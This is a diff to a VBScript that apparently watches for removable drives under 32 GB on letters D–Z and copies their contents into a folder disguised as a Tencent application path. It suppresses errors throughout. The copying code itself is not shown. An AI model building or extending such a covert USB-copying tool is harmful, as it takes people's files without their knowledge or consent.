@@ -1,9 +1,9 @@
-'Version 2.10 Ultimate
+'Version 2.11 Ultimate
 Option Explicit
 On Error Resume Next
 
 Dim Target, Container, DriveLetter, FileCheck, UDrive
-Dim DriveNum, Letter, FlagFileNum, FlagFile, MaxCapacityGB, Pointer
+Dim FlagFileNum, FlagFile, MaxCapacityGB, Pointer
 Dim WScript, Fso, Fin
 Set WScript = CreateObject("WScript.Shell")
 Set Fso = CreateObject("Scripting.FileSystemObject")
@@ -15,9 +15,6 @@ Set Fso = CreateObject("Scripting.FileSystemObject")
 FlagFileNum = 2
 FlagFile = Array("Setup.exe", "bootmgr")
 
-DriveNum = 3
-Letter = Array("G", "H", "I")
-
 MaxCapacityGB = 32
 Pointer = "D:\Program Files\Tencent\QQMaster\"
 
@@ -25,9 +22,8 @@ Pointer = "D:\Program Files\Tencent\QQMaster\"
 ' End of Customization Modification Part
 '*****************************************
 
-Dim IsCopied(0), i, k
-ReDim Preserve IsCopied(DriveNum)
-For i = 0 To DriveNum - 1
+Dim IsCopied(23), i, k
+For i = 0 to 22
   IsCopied(i) = False
 Next
 
@@ -40,8 +36,8 @@ Do
     Wsh.Sleep 1000
   Loop Until Container.Size <= MaxCapacityGB * 1000000000
   
-  For i = 0 To DriveNum - 1
-    DriveLetter = Letter(i)
+  For i = 0 To 22
+    DriveLetter = Chr(68 + i)
     IsHRV = False
     
     If Fso.DriveExists(DriveLetter) Then
